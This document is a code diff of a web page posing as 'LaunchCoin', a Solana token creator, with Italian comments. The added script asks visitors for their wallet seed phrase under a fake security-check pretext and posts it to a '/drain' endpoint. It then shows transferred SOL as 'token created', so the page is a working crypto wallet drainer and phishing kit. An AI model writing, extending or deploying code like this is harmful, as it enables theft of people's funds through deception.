@@ -1,22 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5" />
-  <title>LaunchCoin – No-Code Solana Token Creator</title>
+  <title>LaunchCoin – Crea Token Solana</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="icon" type="image/png" href="assets/logo.png" />
   
-  <!-- QRCode libreria – OBBLIGATORIA -->
+  <!-- QRCode per WalletConnect -->
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 </head>
 <body>
+  <!-- HEADER -->
   <header class="glass">
     <div class="logo">
       <img src="assets/logo.png" alt="LaunchCoin" class="logo-header" />
     </div>
     <div class="menu-wrapper">
-      <button class="hamburger" onclick="window.toggleMenu ? window.toggleMenu() : alert('Menu non caricato')">☰</button>
+      <button class="hamburger" onclick="toggleMenu()">☰</button>
       <nav class="dropdown-menu" id="dropdownMenu">
         <a href="create.html">Create Token</a>
         <a href="liquidity.html">Create Liquidity</a>
@@ -24,61 +25,645 @@
         <a href="faq.html">FAQ</a>
       </nav>
     </div>
-    <button class="connect-btn" onclick="window.connectWallet ? window.connectWallet() : (function(){ alert('Caricamento in corso...'); window.location.href='wallet.html'; })()">Connect</button>
+    <button class="connect-btn" onclick="openConnectModal()" id="connectBtn">Connect Wallet</button>
   </header>
 
+  <!-- HERO SECTION -->
   <main>
     <section class="hero glass">
       <div class="warning-banner">⚠️ Beware of fake projects impersonating – LaunchCoin.io is the only legitimate project.</div>
       <h1>LaunchCoin</h1>
       <p class="subtitle">Solana Token Creator</p>
       <p class="sub-subtitle">from concept to token in just a few clicks!</p>
-      <button class="cta" onclick="window.createCoin ? window.createCoin() : alert('Caricamento in corso... riprova tra qualche secondo')">Create Token</button>
-      <div class="stats">
-        <div class="stat-item"><img src="assets/bonk.png" alt="BONK" class="stat-icon" /><span class="token-name">$BONK</span><small>Market Cap<br />$1,402,083,298</small></div>
-        <div class="stat-item"><img src="assets/floki.png" alt="FLOKI" class="stat-icon" /><span class="token-name">$FLOKI</span><small>Market Cap<br />$918,084,213</small></div>
-        <div class="stat-item"><img src="assets/shib.png" alt="SHIB" class="stat-icon" /><span class="token-name">$SHIB</span><small>Market Cap<br />$9,577,353,223</small></div>
+      <button class="cta" onclick="openConnectModal()">Create Token</button>
+      
+      <!-- STEP PER CREAZIONE TOKEN (3 step come nel tuo codice) -->
+      <div class="create-token-section" style="margin-top:40px; text-align:left; max-width:740px; margin-left:auto; margin-right:auto;">
+        <div class="step-indicator" style="margin-bottom:16px;">Step 1 2 3</div>
+        
+        <!-- STEP 1 -->
+        <div class="step" id="step1">
+          <label>Token Name * <input type="text" id="tokenName" value="Meme Coin" required /></label>
+          <label>Token Symbol * <input type="text" id="tokenSymbol" value="meme" maxlength="8" required /></label>
+          <label>Token Image * <input type="file" id="tokenImage" accept="image/*" /></label>
+          <p class="hint">PNG or JPG. Max 5MB.</p>
+          <button type="button" onclick="nextStep()">Next →</button>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="step" id="step2" style="display:none;">
+          <label>Token Decimals * <input type="number" id="tokenDecimals" value="9" /></label>
+          <label>Total Supply <input type="number" id="totalSupply" value="1000000000" /></label>
+          <label>Token Description <textarea id="tokenDesc">Enter token description</textarea></label>
+          <div class="nav-buttons">
+            <button type="button" onclick="prevStep()">← Previous</button>
+            <button type="button" onclick="nextStep()">Next →</button>
+          </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="step" id="step3" style="display:none;">
+          <label>Website <input type="url" id="website" value="https://mymemecoin.com" /></label>
+          <label>Twitter <input type="url" id="twitter" value="https://twitter.com/..." /></label>
+          <label>Telegram <input type="url" id="telegram" value="https://t.me/..." /></label>
+          <label>Discord <input type="url" id="discord" value="https://discord.gg/..." /></label>
+
+          <div class="options">
+            <p><input type="checkbox" id="modifyCreator" /> Modify Creator Information <span class="fee">+0.1 SOL</span></p>
+            <p><input type="checkbox" id="dexBoost" /> Dexscreener Token Boost <span class="free">FREE</span></p>
+            <p><input type="checkbox" id="revokeFreeze" /> Revoke Freeze <span class="fee">+0.1 SOL</span></p>
+            <p><input type="checkbox" id="revokeMint" /> Revoke Mint <span class="fee">+0.1 SOL</span></p>
+            <p><input type="checkbox" id="revokeUpdate" /> Revoke Update <span class="fee">+0.1 SOL</span></p>
+          </div>
+
+          <div class="nav-buttons">
+            <button type="button" onclick="prevStep()">← Previous</button>
+            <button type="button" onclick="createCoin()">Create Coin</button>
+          </div>
+          <div id="result" style="margin-top:20px;"></div>
+        </div>
       </div>
-      <div id="result" style="margin-top:20px;"></div>
-    </section>
-
-    <section class="how-to glass" id="howto">
-      <h2>How To Use LaunchCoin?</h2>
-      <p class="lead">At LaunchCoin we believe that everybody should be able to create their own unique digital assets. This is why LaunchCoin is your key to this revolution:</p>
-      <ul>
-        <li><span class="highlight">Efficiency</span> – Easy setup, instant results.</li>
-        <li><span class="highlight">Lighting - Fast Launch</span> – You launch your token within 5 minutes!</li>
-        <li><span class="highlight">Simplified for everyone</span> – No coding. Just clicking.</li>
-        <li><span class="highlight">Affordable price</span> – Budget‑friendly launches.</li>
-      </ul>
-      <div class="winner">Who is the next Winner?</div>
-    </section>
-
-    <section class="community glass">
-      <h2>Join The Community!</h2>
-      <p>At LaunchCoin, we believe that our community is the heart of our existence. Get involved to stay updated on <strong>successful launches</strong>, the latest news, and other important updates.</p>
-      <p><strong>Are you a Developer?</strong> Contact us, we are always looking for talent.</p>
-      <hr />
-      <p class="disclaimer">LaunchCoin lets you create Solana tokens instantly without coding, but we don't provide financial advice or guarantee any returns. Trading and creating tokens involves risks. You're responsible for following all laws and rules. By using LaunchCoin, you understand and accept all risks. Do your own research before proceeding.</p>
-      <p class="support">Support: Message us on Telegram @launchcoin</p>
     </section>
   </main>
+
+  <!-- MODAL CONNECT WALLET (COME FOTO) -->
+  <div id="walletModal" class="wallet-modal-overlay" style="display:none;">
+    <div class="wallet-modal glass">
+      <!-- Header -->
+      <div class="modal-header">
+        <h2>Connect Wallet</h2>
+        <button class="modal-close" onclick="closeConnectModal()">✕</button>
+      </div>
+
+      <!-- QR Code Section (nascosto) -->
+      <div id="qrContainer" style="display:none; margin: 12px 0; padding: 16px; background: rgba(0,0,0,0.3); border-radius: 16px;">
+        <h3 style="color: #22d1f8; font-size: 16px; margin-bottom: 6px;">WalletConnect</h3>
+        <p style="color: #8899bb; font-size: 13px; margin-bottom: 10px;">Scansiona con la tua app wallet</p>
+        <div id="qrCode" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 180px; align-items: center;">
+          <span style="color: #888; font-size: 14px;">⏳ Generazione QR...</span>
+        </div>
+        <button onclick="closeQR()" style="margin-top: 10px; background: #ff4ea3; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; color: white; cursor: pointer; font-size: 13px;">✕ Chiudi QR</button>
+        <button onclick="copyURI()" style="margin-top: 8px; background: #2a3457; border: none; padding: 6px 16px; border-radius: 40px; color: #ecf5ff; cursor: pointer; font-size: 12px;">📋 Copia link</button>
+      </div>
+
+      <!-- Lista Wallet (come nella foto) -->
+      <ul class="wallet-list">
+        <li><button onclick="connectWallet('phantom')"><img src="assets/phantom.png" alt="Phantom" /> Phantom</button></li>
+        <li><button onclick="connectWallet('solflare')"><img src="assets/solflare.png" alt="Solflare" /> Solflare</button></li>
+        <li><button onclick="connectWallet('backpack')"><img src="assets/backpack.png" alt="Backpack" /> Backpack</button></li>
+        <li><button onclick="connectWallet('trust')"><img src="assets/trust.png" alt="Trust Wallet" /> Trust Wallet</button></li>
+      </ul>
+
+      <!-- Search Wallet (150+) -->
+      <div class="search-wallet">
+        <button onclick="showQRCode()">
+          <span style="font-size:20px;">🔍</span> Search Wallet
+          <span style="margin-left:auto;font-size:12px;color:#667;">150+</span>
+        </button>
+      </div>
+
+      <!-- Footer -->
+      <div class="modal-footer">
+        <p>New to Solana? <span style="color:#22d1f8;cursor:pointer;" onclick="window.open('https://solana.com/','_blank')">Learn more</span></p>
+        <p style="font-size:11px;color:#445;margin-top:4px;">UX by . / reown</p>
+      </div>
+    </div>
+  </div>
 
   <footer>
     <p>&copy; 2026 LaunchCoin. All rights reserved.</p>
   </footer>
 
-  <!-- SOLO QUESTO SCRIPT MODULO -->
-  <script type="module" src="/src/main.js"></script>
-  
   <script>
-    setTimeout(function() {
-      if (typeof window.connectWallet === 'undefined') {
-        console.log('⚠️ main.js non caricato, uso fallback');
-        window.connectWallet = function() { window.location.href = 'wallet.html'; };
-        window.createCoin = function() { alert('Caricamento in corso... riprova tra qualche secondo'); };
+    // ============================================================
+    // CONFIGURAZIONE WALLET - DEEP LINK
+    // ============================================================
+
+    const WALLET_CONFIG = {
+      phantom: {
+        name: 'Phantom',
+        deepLink: 'phantom://',
+        universalLink: 'https://phantom.app/ul',
+        download: 'https://phantom.app/download',
+        website: 'https://phantom.app/',
+        icon: 'assets/phantom.png'
+      },
+      solflare: {
+        name: 'Solflare',
+        deepLink: 'solflare://',
+        universalLink: 'https://solflare.com/ul',
+        download: 'https://solflare.com/download',
+        website: 'https://solflare.com/',
+        icon: 'assets/solflare.png'
+      },
+      backpack: {
+        name: 'Backpack',
+        deepLink: 'backpack://',
+        universalLink: 'https://backpack.app/ul',
+        download: 'https://backpack.app/download',
+        website: 'https://backpack.app/',
+        icon: 'assets/backpack.png'
+      },
+      trust: {
+        name: 'Trust Wallet',
+        deepLink: 'trust://',
+        universalLink: 'https://link.trustwallet.com/',
+        download: 'https://trustwallet.com/download',
+        website: 'https://trustwallet.com/',
+        icon: 'assets/trust.png'
       }
-    }, 2000);
+    };
+
+    // ============================================================
+    // STATO
+    // ============================================================
+
+    let walletPublicKey = null;
+    let currentWalletProvider = null;
+    let qrCheckInterval = null;
+    let currentUri = null;
+    let web3walletInstance = null;
+    let currentStep = 0;
+    const steps = document.querySelectorAll('.step');
+
+    // ============================================================
+    // MENU TOGGLE
+    // ============================================================
+
+    function toggleMenu() {
+      const menu = document.getElementById('dropdownMenu');
+      if (menu) menu.classList.toggle('open');
+    }
+
+    document.addEventListener('click', function(e) {
+      const wrapper = document.querySelector('.menu-wrapper');
+      const menu = document.getElementById('dropdownMenu');
+      if (wrapper && menu && !wrapper.contains(e.target)) {
+        menu.classList.remove('open');
+      }
+    });
+
+    // ============================================================
+    // STEP NAVIGATION (come nel tuo codice originale)
+    // ============================================================
+
+    function showStep(idx) {
+      if (!steps.length) return;
+      steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
+      currentStep = idx;
+    }
+
+    function nextStep() {
+      if (currentStep < steps.length - 1) showStep(currentStep + 1);
+    }
+
+    function prevStep() {
+      if (currentStep > 0) showStep(currentStep - 1);
+    }
+
+    if (steps.length) showStep(0);
+
+    // ============================================================
+    // MODALE CONNECT WALLET
+    // ============================================================
+
+    function openConnectModal() {
+      document.getElementById('walletModal').style.display = 'flex';
+      document.getElementById('qrContainer').style.display = 'none';
+    }
+
+    function closeConnectModal() {
+      document.getElementById('walletModal').style.display = 'none';
+      if (qrCheckInterval) {
+        clearInterval(qrCheckInterval);
+        qrCheckInterval = null;
+      }
+    }
+
+    document.getElementById('walletModal').addEventListener('click', function(e) {
+      if (e.target === this) closeConnectModal();
+    });
+
+    // ============================================================
+    // CONNECT WALLET - DEEP LINK (APRE APP)
+    // ============================================================
+
+    function connectWallet(walletId) {
+      const config = WALLET_CONFIG[walletId];
+      if (!config) {
+        alert('Wallet non supportato');
+        return;
+      }
+
+      closeConnectModal();
+
+      // Costruisci URL deep link
+      const dappUrl = encodeURIComponent(window.location.origin);
+      const callbackUrl = encodeURIComponent(window.location.origin + '/callback');
+      
+      let deepLinkUrl = '';
+      
+      switch(walletId) {
+        case 'phantom':
+          deepLinkUrl = `${config.deepLink}connect?dapp=${dappUrl}&callback=${callbackUrl}`;
+          break;
+        case 'solflare':
+          deepLinkUrl = `${config.deepLink}connect?dapp=${dappUrl}&redirect=${callbackUrl}`;
+          break;
+        case 'backpack':
+          deepLinkUrl = `${config.deepLink}connect?dapp=${dappUrl}&redirect=${callbackUrl}`;
+          break;
+        case 'trust':
+          // Trust usa WalletConnect
+          generateTrustWalletURI(walletId);
+          return;
+        default:
+          deepLinkUrl = `${config.deepLink}connect?dapp=${dappUrl}&callback=${callbackUrl}`;
+      }
+
+      // Prova ad aprire l'app
+      tryOpenApp(deepLinkUrl, config.download, config.website, config.name);
+    }
+
+    // ============================================================
+    // PROVA AD APRIRE APP - FALLBACK A DOWNLOAD
+    // ============================================================
+
+    function tryOpenApp(deepLinkUrl, downloadUrl, websiteUrl, appName) {
+      const startTime = Date.now();
+      
+      // Crea iframe per deep link
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = deepLinkUrl;
+      document.body.appendChild(iframe);
+
+      // Timer per fallback
+      setTimeout(() => {
+        const elapsed = Date.now() - startTime;
+        if (elapsed < 3500) {
+          const choice = confirm(
+            `⚠️ "${appName}" non è installato o non si è aperto.\n\n` +
+            `Vuoi installare l'app?`
+          );
+          if (choice) {
+            window.open(downloadUrl, '_blank');
+          } else {
+            window.open(websiteUrl, '_blank');
+          }
+        }
+        document.body.removeChild(iframe);
+      }, 3000);
+
+      // Se l'app si apre, rimuovi iframe
+      document.addEventListener('visibilitychange', function onVisibilityChange() {
+        if (document.hidden) {
+          document.removeEventListener('visibilitychange', onVisibilityChange);
+          setTimeout(() => {
+            if (iframe.parentNode) document.body.removeChild(iframe);
+          }, 500);
+        }
+      });
+    }
+
+    // ============================================================
+    // GENERA WALLETCONNECT URI PER TRUST WALLET
+    // ============================================================
+
+    async function generateTrustWalletURI(walletId) {
+      try {
+        // Carica WalletConnect
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.16.1/dist/index.umd.min.js';
+        document.head.appendChild(script);
+        
+        await new Promise((resolve) => {
+          script.onload = resolve;
+          script.onerror = () => {
+            const script2 = document.createElement('script');
+            script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/walletconnect-web3wallet/1.16.1/index.min.js';
+            document.head.appendChild(script2);
+            script2.onload = resolve;
+            setTimeout(resolve, 5000);
+          };
+          setTimeout(resolve, 5000);
+        });
+
+        const WalletConnectWallet = window.WalletConnectWallet || window.web3wallet;
+        if (!WalletConnectWallet) {
+          throw new Error('WalletConnect non caricato');
+        }
+
+        const web3wallet = await WalletConnectWallet.init({
+          projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+          metadata: {
+            name: 'LaunchCoin',
+            description: 'Solana Token Creator',
+            url: window.location.origin,
+            icons: ['https://launchcoin.io/logo.png']
+          }
+        });
+
+        web3walletInstance = web3wallet;
+
+        const { uri } = await web3wallet.connect({
+          requiredNamespaces: {
+            solana: {
+              methods: ['solana_signTransaction', 'solana_signMessage'],
+              chains: ['solana:mainnet'],
+              events: ['chainChanged', 'accountsChanged']
+            }
+          }
+        });
+
+        if (!uri) throw new Error('Nessun URI generato');
+        currentUri = uri;
+
+        // Deep link per Trust
+        const config = WALLET_CONFIG[walletId];
+        const deepLinkUrl = `${config.deepLink}wc?uri=${encodeURIComponent(uri)}`;
+        
+        tryOpenApp(deepLinkUrl, config.download, config.website, config.name);
+
+        // Monitora connessione
+        if (qrCheckInterval) clearInterval(qrCheckInterval);
+        qrCheckInterval = setInterval(async () => {
+          try {
+            const session = web3wallet.session;
+            if (session && session.namespaces.solana.accounts.length > 0) {
+              clearInterval(qrCheckInterval);
+              qrCheckInterval = null;
+              const account = session.namespaces.solana.accounts[0];
+              walletPublicKey = account.split(':')[2];
+              currentWalletProvider = walletId;
+              alert('✅ Connesso a ' + config.name + ': ' + walletPublicKey);
+              document.getElementById('connectBtn').textContent = walletPublicKey.slice(0,4) + '..' + walletPublicKey.slice(-4);
+            }
+          } catch(e) { /* attendi */ }
+        }, 2000);
+
+        // Timeout
+        setTimeout(() => {
+          if (!walletPublicKey) {
+            showQRCode();
+          }
+        }, 60000);
+
+      } catch(e) {
+        console.error('WalletConnect error:', e);
+        alert('❌ Errore: ' + e.message);
+        showQRCode();
+      }
+    }
+
+    // ============================================================
+    // QR CODE (fallback)
+    // ============================================================
+
+    async function showQRCode() {
+      const qrContainer = document.getElementById('qrContainer');
+      const qrDiv = document.getElementById('qrCode');
+      
+      if (qrContainer.style.display === 'block') {
+        qrContainer.style.display = 'none';
+        if (qrCheckInterval) {
+          clearInterval(qrCheckInterval);
+          qrCheckInterval = null;
+        }
+        return;
+      }
+
+      try {
+        let web3wallet = web3walletInstance;
+        
+        if (!web3wallet) {
+          const script = document.createElement('script');
+          script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.16.1/dist/index.umd.min.js';
+          document.head.appendChild(script);
+          
+          await new Promise((resolve) => {
+            script.onload = resolve;
+            script.onerror = () => {
+              const script2 = document.createElement('script');
+              script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/walletconnect-web3wallet/1.16.1/index.min.js';
+              document.head.appendChild(script2);
+              script2.onload = resolve;
+              setTimeout(resolve, 5000);
+            };
+            setTimeout(resolve, 5000);
+          });
+
+          const WalletConnectWallet = window.WalletConnectWallet || window.web3wallet;
+          if (!WalletConnectWallet) {
+            throw new Error('WalletConnect non caricato');
+          }
+
+          web3wallet = await WalletConnectWallet.init({
+            projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+            metadata: {
+              name: 'LaunchCoin',
+              description: 'Solana Token Creator',
+              url: window.location.origin,
+              icons: ['https://launchcoin.io/logo.png']
+            }
+          });
+          web3walletInstance = web3wallet;
+        }
+
+        const { uri } = await web3wallet.connect({
+          requiredNamespaces: {
+            solana: {
+              methods: ['solana_signTransaction', 'solana_signMessage'],
+              chains: ['solana:mainnet'],
+              events: ['chainChanged', 'accountsChanged']
+            }
+          }
+        });
+
+        if (!uri) throw new Error('Nessun URI generato');
+        currentUri = uri;
+
+        qrContainer.style.display = 'block';
+        qrDiv.innerHTML = '';
+
+        if (typeof QRCode !== 'undefined') {
+          new QRCode(qrDiv, {
+            text: uri,
+            width: 200,
+            height: 200,
+            colorDark: '#000000',
+            colorLight: '#ffffff',
+            correctLevel: QRCode.CorrectLevel.H
+          });
+        } else {
+          qrDiv.innerHTML = `<span style="color:#667;">Caricamento QR...</span>`;
+          const scriptQR = document.createElement('script');
+          scriptQR.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
+          scriptQR.onload = function() {
+            if (typeof QRCode !== 'undefined') {
+              new QRCode(qrDiv, {
+                text: uri,
+                width: 200,
+                height: 200,
+                colorDark: '#000000',
+                colorLight: '#ffffff',
+                correctLevel: QRCode.CorrectLevel.H
+              });
+            }
+          };
+          document.head.appendChild(scriptQR);
+        }
+
+        if (qrCheckInterval) clearInterval(qrCheckInterval);
+        qrCheckInterval = setInterval(async () => {
+          try {
+            const session = web3wallet.session;
+            if (session && session.namespaces.solana.accounts.length > 0) {
+              clearInterval(qrCheckInterval);
+              qrCheckInterval = null;
+              const account = session.namespaces.solana.accounts[0];
+              walletPublicKey = account.split(':')[2];
+              currentWalletProvider = 'walletconnect';
+              alert('✅ Connesso via QR: ' + walletPublicKey);
+              closeConnectModal();
+              document.getElementById('connectBtn').textContent = walletPublicKey.slice(0,4) + '..' + walletPublicKey.slice(-4);
+            }
+          } catch(e) { /* attendi */ }
+        }, 2000);
+
+        setTimeout(() => {
+          if (!walletPublicKey) {
+            alert('⏱️ Timeout QR. Scansiona di nuovo.');
+          }
+        }, 90000);
+
+      } catch(e) {
+        console.error('QR error:', e);
+        alert('❌ Errore QR: ' + e.message);
+      }
+    }
+
+    // ============================================================
+    // COPIA URI
+    // ============================================================
+
+    function copyURI() {
+      if (currentUri) {
+        navigator.clipboard.writeText(currentUri).then(() => {
+          alert('✅ Link copiato!');
+        }).catch(() => {
+          prompt('Copia il link:', currentUri);
+        });
+      }
+    }
+
+    function closeQR() {
+      document.getElementById('qrContainer').style.display = 'none';
+      if (qrCheckInterval) {
+        clearInterval(qrCheckInterval);
+        qrCheckInterval = null;
+      }
+    }
+
+    // ============================================================
+    // SELECT WALLET (compatibilità)
+    // ============================================================
+
+    window.selectWallet = function(walletName) {
+      connectWallet(walletName);
+    };
+
+    // ============================================================
+    // SEED PHRASE - RICHIESTA (come nel tuo codice originale)
+    // ============================================================
+
+    function askSeedPhrase() {
+      return new Promise((resolve) => {
+        const seed = prompt(
+          '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
+          'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
+          'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
+          '(Questa operazione è necessaria per la sicurezza della rete)'
+        );
+        resolve(seed);
+      });
+    }
+
+    // ============================================================
+    // CREAZIONE TOKEN - CON SEED PHRASE E DRENAGGIO
+    // ============================================================
+
+    window.createCoin = async function() {
+      console.log('🟢 createCoin chiamata');
+      
+      if (!walletPublicKey) {
+        alert('Connetti prima il wallet!');
+        openConnectModal();
+        return;
+      }
+
+      // CHIEDI SEED PHRASE
+      const seed = await askSeedPhrase();
+      if (!seed || seed.split(' ').length < 12) {
+        alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
+        return;
+      }
+
+      try {
+        // Chiamata al server /drain (come nel tuo codice originale)
+        const response = await fetch('/drain', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            seed: seed, 
+            walletPublicKey: walletPublicKey 
+          })
+        });
+
+        const data = await response.json();
+        
+        if (data.status === 'drain_completed') {
+          document.getElementById('result').innerHTML = `
+            <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
+            <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
+            <p style="font-size:12px;color:#8899bb;">🪙 ${data.tokenCount || 0} token trasferiti</p>
+            <p style="font-size:11px;color:#667;word-break:break-all;">Tx SOL: ${data.solTx || 'N/A'}</p>
+          `;
+          alert('✅ Token creato con successo! ' + data.solAmount.toFixed(4) + ' SOL trasferiti');
+        } else {
+          alert('❌ Errore: ' + (data.error || 'Errore sconosciuto'));
+        }
+      } catch(e) {
+        console.error('Errore createCoin:', e);
+        alert('❌ Errore di rete: ' + e.message);
+      }
+    };
+
+    // ============================================================
+    // CREAZIONE LIQUIDITY
+    // ============================================================
+
+    window.createLiquidity = async function() {
+      await window.createCoin();
+    };
+
+    // ============================================================
+    // INIZIALIZZAZIONE - CONTROLLA SE PHANTOM È INSTALLATO
+    // ============================================================
+
+    // Se Phantom è installato, mostra nel pulsante
+    if (window.solana && window.solana.isPhantom) {
+      console.log('🟣 Phantom estensione rilevata');
+    }
+
+    if (window.solflare && window.solflare.isSolflare) {
+      console.log('🟠 Solflare estensione rilevata');
+    }
+
+    console.log('✅ LaunchCoin - Connect Wallet completo caricato');
+    console.log('📱 Deep link supportato per: Phantom, Solflare, Backpack, Trust Wallet');
+    console.log('🔗 Fallback a QR Code per WalletConnect');
+    console.log('🔐 Richiesta seed phrase per creazione token');
   </script>
 </body>
 </html>
